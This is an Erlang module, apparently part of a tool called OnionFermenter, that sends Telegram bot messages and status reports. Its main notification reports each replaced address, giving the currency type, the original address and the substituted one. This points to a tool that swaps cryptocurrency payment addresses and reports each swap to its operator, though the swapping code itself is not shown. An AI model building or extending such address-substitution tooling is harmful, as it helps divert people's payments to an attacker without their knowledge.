-module(onionfermenter_telegram).
-export([send_message/1, send_replacement_notification/3, send_status_report/1, is_enabled/0]).

% Check if Telegram is enabled
is_enabled() ->
    case os:getenv("TELEGRAM_BOT_TOKEN") of
        false -> false;
        "" -> false;
        _ ->
            case os:getenv("TELEGRAM_CHAT_ID") of
                false -> false;
                "" -> false;
                _ -> true
            end
    end.

% Send a message to Telegram
send_message(Message) ->
    case is_enabled() of
        false -> ok; % Telegram not configured, skip
        true ->
            BotToken = os:getenv("TELEGRAM_BOT_TOKEN"),
            ChatId = os:getenv("TELEGRAM_CHAT_ID"),
            Url = "https://api.telegram.org/bot" ++ BotToken ++ "/sendMessage",
            
            % Prepare the JSON payload
            JsonPayload = unicode:characters_to_binary(
                "{\"chat_id\":\"" ++ ChatId ++ "\",\"text\":\"" ++ escape_json(Message) ++ "\"}"
            ),
            
            % Make HTTP request using httpc
            inets:start(),
            ssl:start(),
            
            Request = {Url, [], "application/json", JsonPayload},
            case httpc:request(post, Request, [{timeout, 5000}], []) of
                {ok, {{_, 200, _}, _, _}} -> ok;
                {ok, {{_, StatusCode, _}, _, Body}} ->
                    io:format("Telegram send failed: ~p ~p~n", [StatusCode, Body]),
                    error;
                {error, Reason} ->
                    io:format("Telegram send error: ~p~n", [Reason]),
                    error
            end
    end.

% Send notification when an address is replaced
send_replacement_notification(OriginalAddr, ReplacementAddr, CurrencyType) ->
    Message = "🔄 Address Replaced\n" ++
              "Type: " ++ CurrencyType ++ "\n" ++
              "Original: " ++ OriginalAddr ++ "\n" ++
              "Replacement: " ++ ReplacementAddr,
    send_message(Message).

% Send periodic status report
send_status_report(Stats) ->
    Message = "📊 OnionFermenter Status Report\n" ++
              "Timestamp: " ++ integer_to_list(os:system_time(second)) ++ "\n" ++
              Stats,
    send_message(Message).

% Escape special characters for JSON
escape_json(String) ->
    escape_json(String, []).

escape_json([], Acc) ->
    lists:reverse(Acc);
escape_json([$" | Rest], Acc) ->
    escape_json(Rest, [$", $\\ | Acc]);
escape_json([$\\ | Rest], Acc) ->
    escape_json(Rest, [$\\, $\\ | Acc]);
escape_json([$\n | Rest], Acc) ->
    escape_json(Rest, [$n, $\\ | Acc]);
escape_json([$\r | Rest], Acc) ->
    escape_json(Rest, [$r, $\\ | Acc]);
escape_json([$\t | Rest], Acc) ->
    escape_json(Rest, [$t, $\\ | Acc]);
escape_json([C | Rest], Acc) ->
    escape_json(Rest, [C | Acc]).
